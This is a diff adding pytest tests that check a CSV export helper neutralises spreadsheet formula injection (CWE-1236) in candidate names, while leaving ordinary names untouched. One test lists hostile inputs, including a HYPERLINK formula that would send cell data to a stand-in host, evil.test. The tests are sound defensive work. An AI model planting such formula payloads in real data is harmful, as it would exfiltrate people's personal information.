@@ -1348,3 +1348,88 @@ def test_filter_builder_returns_three_tuple() -> None:
     assert "ORDER BY" not in where  # count query can use where_clause safely
     assert "ORDER BY" in order
     assert isinstance(params, dict)
+
+
+def test_csv_neutralises_spreadsheet_formula_prefixes() -> None:
+    """CWE-1236: a candidate-chosen name must not become a formula in Excel.
+
+    ``candidate_name`` is ``users.full_name``, which the data subject sets at
+    open self-registration with no character restriction. csv quoting makes the
+    file parse correctly but does NOT stop a spreadsheet evaluating a cell that
+    starts with '=' — and this export is opened by the platform owner while
+    carrying every tenant's candidate PII, which is exactly what a
+    HYPERLINK/WEBSERVICE payload would exfiltrate.
+
+    Asserts on the PARSED cell, so it fails if the guard is removed rather than
+    passing on incidental quoting.
+    """
+    import csv as csv_mod
+    import io
+
+    from app.routers.analytics import _csv_line
+
+    header = (
+        "session_id,candidate_email,candidate_name,job_title,"
+        "status,language,composite_score,created_at,completed_at,duration_seconds\n"
+    )
+
+    for hostile in (
+        '=HYPERLINK("http://evil.test?x="&A1,"click")',
+        "+1+1",
+        "-1+1",
+        "@SUM(A1)",
+        "\tleading-tab",
+        "\rleading-cr",
+    ):
+        row: dict[str, Any] = {
+            "session_id": _SESSION_ID,
+            "candidate_email": _CANDIDATE_EMAIL,
+            "candidate_name": hostile,
+            "job_title": hostile,
+            "status": "completed",
+            "language": "en",
+            "composite_score": 7.5,
+            "created_at": _NOW,
+            "completed_at": None,
+            "duration_seconds": 300,
+        }
+        parsed = next(csv_mod.DictReader(io.StringIO(header + _csv_line(row))))
+
+        for field in ("candidate_name", "job_title"):
+            cell = parsed[field]
+            assert not cell.startswith(("=", "+", "-", "@", "\t", "\r")), (
+                f"{field} still starts with a formula trigger: {cell!r}"
+            )
+            # Neutralised, not silently dropped — the operator must still be
+            # able to read the real name.
+            assert hostile.strip() in cell or hostile in cell, (
+                f"{field} lost its content: {cell!r}"
+            )
+
+
+def test_csv_leaves_ordinary_names_untouched() -> None:
+    """The guard must not put a stray apostrophe on every normal name."""
+    import csv as csv_mod
+    import io
+
+    from app.routers.analytics import _csv_line
+
+    row: dict[str, Any] = {
+        "session_id": _SESSION_ID,
+        "candidate_email": _CANDIDATE_EMAIL,
+        "candidate_name": "Priya Sharma",
+        "job_title": "CNC Machine Operator",
+        "status": "completed",
+        "language": "en",
+        "composite_score": 7.5,
+        "created_at": _NOW,
+        "completed_at": None,
+        "duration_seconds": 300,
+    }
+    header = (
+        "session_id,candidate_email,candidate_name,job_title,"
+        "status,language,composite_score,created_at,completed_at,duration_seconds\n"
+    )
+    parsed = next(csv_mod.DictReader(io.StringIO(header + _csv_line(row))))
+    assert parsed["candidate_name"] == "Priya Sharma"
+    assert parsed["job_title"] == "CNC Machine Operator"
